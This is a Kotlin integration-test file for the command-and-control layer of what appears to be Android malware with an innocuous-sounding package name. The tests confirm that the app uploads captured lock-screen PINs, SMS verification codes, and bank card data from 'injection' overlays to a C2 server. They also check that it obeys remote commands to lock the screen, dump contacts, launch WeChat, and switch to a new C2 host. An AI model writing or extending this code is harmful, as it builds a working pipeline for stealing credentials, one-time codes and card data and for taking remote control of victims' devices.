package com.storm.safe.rock.network

import kotlinx.coroutines.test.runTest
import okhttp3.mockwebserver.Dispatcher
import okhttp3.mockwebserver.MockResponse
import okhttp3.mockwebserver.MockWebServer
import okhttp3.mockwebserver.RecordedRequest
import org.json.JSONObject
import org.junit.After
import org.junit.Assert.*
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.RuntimeEnvironment
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

/**
 * End-to-end integration tests for the C2 communication layer.
 *
 * Verifies:
 * 1. HTTP: All 7 endpoints reachable with correct payloads and HMAC auth
 * 2. WebSocket: Connect + message exchange + probe response
 * 3. Command dispatch: WS command message → CommandRequest → callback
 */
@RunWith(RobolectricTestRunner::class)
class NetworkIntegrationTest {

    private lateinit var httpServer: MockWebServer
    private lateinit var httpManager: HttpManager

    @Before
    fun setup() {
        httpServer = MockWebServer()
        httpServer.start()
        val baseUrl = httpServer.url("/").toString().trimEnd('/')
        httpManager = HttpManager(RuntimeEnvironment.getApplication())
        httpManager.baseUrl = baseUrl
        httpManager.deviceId = "integration-test-device"
        httpManager.ownerToken = "integration-test-token"
    }

    @After
    fun teardown() {
        try { httpServer.shutdown() } catch (_: Exception) {}
    }

    // =========================================================================
    // HTTP Integration: All 7 endpoints in sequence
    // =========================================================================

    @Test
    fun `HTTP full cycle - all 7 endpoints with auth verification`() = runTest {
        httpServer.dispatcher = object : Dispatcher() {
            override fun dispatch(request: RecordedRequest): MockResponse {
                val path = request.path ?: ""
                return when {
                    path.startsWith("/api/client/register") -> {
                        assertNull("register must NOT have auth", request.getHeader("X-Device-ID"))
                        MockResponse().setBody("""{"id":"reg-001","status":"registered"}""")
                    }
                    path.startsWith("/api/sync/credentials") -> {
                        verifyAuth(request)
                        MockResponse().setBody("""{"stored":true}""")
                    }
                    path.startsWith("/api/sync/messages") -> {
                        verifyAuth(request)
                        MockResponse().setBody("""{"count":1}""")
                    }
                    path.startsWith("/api/sync/inbox") -> {
                        verifyAuth(request)
                        MockResponse().setBody("""{"received":true}""")
                    }
                    path.startsWith("/api/client/logs") -> {
                        verifyAuth(request)
                        MockResponse().setBody("""{"logged":true}""")
                    }
                    path.startsWith("/api/sync/form") -> {
                        verifyAuth(request)
                        MockResponse().setBody("""{"captured":true}""")
                    }
                    path.startsWith("/api/sync/status") -> {
                        verifyAuth(request)
                        MockResponse().setBody("""{"ack":true}""")
                    }
                    else -> MockResponse().setResponseCode(404)
                }
            }
        }

        // 1. register (no auth)
        val regResult = httpManager.register(JSONObject().apply {
            put("deviceId", "integration-test-device")
            put("model", "Xiaomi 13")
            put("os", "Android 15")
        })
        assertTrue("register should succeed", regResult.isSuccess)
        assertEquals("registered", regResult.getOrThrow().getString("status"))

        // 2. uploadPasswordCapture (auth)
        val pwResult = httpManager.uploadPasswordCapture(
            password = "123456",
            passwordType = "pin",
            inputMethod = "system",
            appName = "Settings",
            packageName = "com.android.settings",
            confidence = 95
        )
        assertTrue("uploadPasswordCapture should succeed", pwResult.isSuccess)

        // 3. uploadSms (auth)
        val smsResult = httpManager.uploadSms(listOf(
            JSONObject().apply { put("from", "+8613800138000"); put("body", "验证码: 123456") },
            JSONObject().apply { put("from", "+8613900139000"); put("body", "余额变动通知") }
        ))
        assertTrue("uploadSms should succeed", smsResult.isSuccess)

        // 4. uploadIncomingSms (auth)
        val inboxResult = httpManager.uploadIncomingSms(
            number = "+8613800138000",
            text = "Your code is 789012",
            type = "received",
            timestamp = System.currentTimeMillis()
        )
        assertTrue("uploadIncomingSms should succeed", inboxResult.isSuccess)

        // 5. uploadLogs (auth)
        val logResult = httpManager.uploadLogs(listOf(
            JSONObject().apply { put("level", "info"); put("msg", "App started"); put("ts", System.currentTimeMillis()) }
        ))
        assertTrue("uploadLogs should succeed", logResult.isSuccess)

        // 6. uploadInjectionData (auth)
        val injResult = httpManager.uploadInjectionData(JSONObject().apply {
            put("bank", "ICBC")
            put("cardNumber", "6222****1234")
            put("cvv", "***")
        })
        assertTrue("uploadInjectionData should succeed", injResult.isSuccess)
        // Verify deviceId was injected
        val injRequest = httpServer.takeRequest(1, TimeUnit.SECONDS)
        // (requests consumed by dispatcher, verify through response)

        // 7. uploadDeviceStatus (auth)
        val statusResult = httpManager.uploadDeviceStatus("heartbeat", JSONObject().apply {
            put("battery", 85)
            put("wifi", true)
            put("screenOn", false)
        })
        assertTrue("uploadDeviceStatus should succeed", statusResult.isSuccess)

        assertEquals("Should have 7 requests total", 7, httpServer.requestCount)
    }

    @Test
    fun `HTTP retry recovers from transient 500 errors`() = runTest {
        var attempt = 0
        httpServer.dispatcher = object : Dispatcher() {
            override fun dispatch(request: RecordedRequest): MockResponse {
                attempt++
                return if (attempt <= 2) {
                    MockResponse().setResponseCode(500).setBody("Internal Server Error")
                } else {
                    MockResponse().setBody("""{"recovered":true}""")
                }
            }
        }

        val result = httpManager.register(JSONObject().apply { put("test", true) })
        assertTrue("Should recover after 2 failures", result.isSuccess)
        assertEquals(3, httpServer.requestCount)
    }

    @Test
    fun `HTTP 403 fails immediately without retry`() = runTest {
        httpServer.dispatcher = object : Dispatcher() {
            override fun dispatch(request: RecordedRequest): MockResponse {
                return MockResponse().setResponseCode(403).setBody("Forbidden - bad token")
            }
        }

        val result = httpManager.uploadPasswordCapture("x", "x", "x", "x", "x", 0)
        assertTrue("Should fail on 403", result.isFailure)
        assertEquals("Should NOT retry on 4xx", 1, httpServer.requestCount)
    }

    // =========================================================================
    // WebSocket: Message handling + command dispatch
    // =========================================================================

    @Test
    fun `WebSocket handleMessage dispatches command via onCommandCallback`() {
        val context = RuntimeEnvironment.getApplication()
        val receivedCommands = mutableListOf<CommandRequest>()
        val latch = CountDownLatch(1)

        val client = DataSyncClient(
            context,
            onMessageCallback = { fail("Should use onCommandCallback, not onMessageCallback") },
            onConnectionChanged = {},
            onCommandCallback = { cmd ->
                receivedCommands.add(cmd)
                latch.countDown()
            }
        )

        // Simulate receiving a command message from C2
        val wsMessage = JSONObject().apply {
            put("type", "command")
            put("data", JSONObject().apply {
                put("command", "LOCK_SCREEN")
                put("params", JSONObject().apply {
                    put("duration", 30)
                    put("message", "Device locked by admin")
                })
                put("taskId", "task-001")
            })
        }
        client.handleMessage(wsMessage.toString())

        assertEquals("Should receive 1 command", 1, receivedCommands.size)
        val cmd = receivedCommands[0]
        assertEquals("LOCK_SCREEN", cmd.command)
        assertEquals(30, cmd.getIntParam("duration"))
        assertEquals("Device locked by admin", cmd.getStringParam("message"))
        assertEquals("task-001", cmd.getStringParam("taskId"))
    }

    @Test
    fun `WebSocket handleMessage falls back to onMessageCallback when no onCommandCallback`() {
        val context = RuntimeEnvironment.getApplication()
        var receivedMessage: String? = null

        val client = DataSyncClient(
            context,
            onMessageCallback = { receivedMessage = it },
            onConnectionChanged = {}
            // onCommandCallback = null (default)
        )

        val wsMessage = JSONObject().apply {
            put("type", "command")
            put("data", JSONObject().apply {
                put("command", "GET_CONTACTS")
                put("params", JSONObject().apply { put("limit", 100) })
            })
        }
        client.handleMessage(wsMessage.toString())

        assertNotNull("Should fall back to onMessageCallback", receivedMessage)
        val parsed = JSONObject(receivedMessage!!)
        assertEquals("GET_CONTACTS", parsed.getString("command"))
    }

    @Test
    fun `WebSocket probe response includes correct device heartbeat`() {
        val context = RuntimeEnvironment.getApplication()
        var sentResponse: String? = null

        val client = object : DataSyncClient(
            context,
            onMessageCallback = {},
            onConnectionChanged = {}
        ) {
            override fun send(message: String): Boolean {
                sentResponse = message
                return true
            }
        }
        client.isConnected = true
        client.deviceId = "probe-test-device-001"

        // Simulate C2 sending a probe
        client.handleMessage("""{"type":"probe"}""")

        assertNotNull("Should respond to probe", sentResponse)
        val response = JSONObject(sentResponse!!)
        assertEquals("status", response.getString("type"))
        assertEquals("probe-test-device-001", response.getString("sessionId"))
        val data = response.getJSONObject("data")
        assertEquals("device_heartbeat", data.getString("type"))
        assertEquals("probe-test-device-001", data.getString("deviceId"))
        assertTrue("Should include timestamp", data.has("timestamp"))
    }

    @Test
    fun `WebSocket ignores pong and unknown message types`() {
        val context = RuntimeEnvironment.getApplication()
        var callbackInvoked = false

        val client = DataSyncClient(
            context,
            onMessageCallback = { callbackInvoked = true },
            onConnectionChanged = {},
            onCommandCallback = { callbackInvoked = true }
        )

        client.handleMessage("""{"type":"pong"}""")
        assertFalse("pong should be silently ignored", callbackInvoked)

        client.handleMessage("""{"type":"server_broadcast","data":"hello"}""")
        assertFalse("unknown type should be silently ignored", callbackInvoked)
    }

    @Test
    fun `WebSocket rejects command with empty command field`() {
        val context = RuntimeEnvironment.getApplication()
        var callbackInvoked = false

        val client = DataSyncClient(
            context,
            onMessageCallback = { callbackInvoked = true },
            onConnectionChanged = {},
            onCommandCallback = { callbackInvoked = true }
        )

        // Command with empty string
        client.handleMessage("""{"type":"command","data":{"command":"","params":{}}}""")
        assertFalse("Empty command should be rejected", callbackInvoked)

        // Command with no command field at all
        client.handleMessage("""{"type":"command","data":{"params":{"key":"value"}}}""")
        assertFalse("Missing command field should be rejected", callbackInvoked)
    }

    // =========================================================================
    // CommandRequest parsing edge cases
    // =========================================================================

    @Test
    fun `CommandRequest handles complex nested params from real C2 payloads`() {
        val realPayload = JSONObject().apply {
            put("command", "CHANGE_SERVER_URL")
            put("params", JSONObject().apply {
                put("serverUrl", "https://new-c2.example.com:8443")
                put("fallbackUrls", "https://backup1.example.com,https://backup2.example.com")
            })
            put("taskId", "url-change-001")
            put("priority", 1)
            put("timestamp", 1700000000000L)
        }

        val req = CommandRequest.fromJson(realPayload)
        assertEquals("CHANGE_SERVER_URL", req.command)
        assertEquals("https://new-c2.example.com:8443", req.getStringParam("serverUrl"))
        assertEquals("url-change-001", req.getStringParam("taskId"))
        assertEquals(1, req.getIntParam("priority"))
    }

    @Test
    fun `CommandRequest handles LAUNCH_APP command with all field types`() {
        val payload = JSONObject().apply {
            put("command", "LAUNCH_APP")
            put("params", JSONObject().apply {
                put("packageName", "com.tencent.mm")
                put("activityName", ".ui.LauncherUI")
                put("retry", 3)
                put("delayMs", 2000)
            })
        }

        val req = CommandRequest.fromJson(payload)
        assertEquals("LAUNCH_APP", req.command)
        assertEquals("com.tencent.mm", req.getStringParam("packageName"))
        assertEquals(".ui.LauncherUI", req.getStringParam("activityName"))
        assertEquals(3, req.getIntParam("retry"))
        assertEquals(2000, req.getIntParam("delayMs"))
        assertEquals("default", req.getStringParam("nonExistent", "default"))
        assertEquals(-1, req.getIntParam("nonExistent", -1))
    }

    // =========================================================================
    // HMAC consistency: HTTP and WS use the same algorithm
    // =========================================================================

    @Test
    fun `Bearer token is consistent between HTTP and WS for same credentials`() = runTest {
        // HTTP: capture the Authorization header
        httpServer.enqueue(MockResponse().setBody("{}").setResponseCode(200))
        httpManager.post("/api/test", JSONObject(), authenticated = true)
        val httpAuth = httpServer.takeRequest().getHeader("Authorization")

        // WS: generate URL and extract token
        val context = RuntimeEnvironment.getApplication()
        val wsClient = DataSyncClient(context, {}, {})
        wsClient.serverUrl = "https://example.com"
        wsClient.deviceId = "integration-test-device"
        wsClient.ownerToken = "integration-test-token"
        val wsUrl = wsClient.generateWsUrl()
        val wsToken = wsUrl.substringAfter("&token=")

        assertNotNull("HTTP Authorization header should exist", httpAuth)
        assertTrue("HTTP auth should be Bearer scheme", httpAuth!!.startsWith("Bearer "))
        assertEquals("Token should match ownerToken", "integration-test-token", wsToken)
        assertEquals("Bearer token value should match WS token", httpAuth.removePrefix("Bearer "), wsToken)
    }

    // =========================================================================
    // Helpers
    // =========================================================================

    private fun verifyAuth(request: RecordedRequest) {
        val deviceId = request.getHeader("X-Device-ID")
        val auth = request.getHeader("Authorization")
        assertEquals("integration-test-device", deviceId)
        assertNotNull("Authenticated endpoint must have Authorization header", auth)
        assertTrue("Authorization must use Bearer scheme", auth!!.startsWith("Bearer "))
    }
}
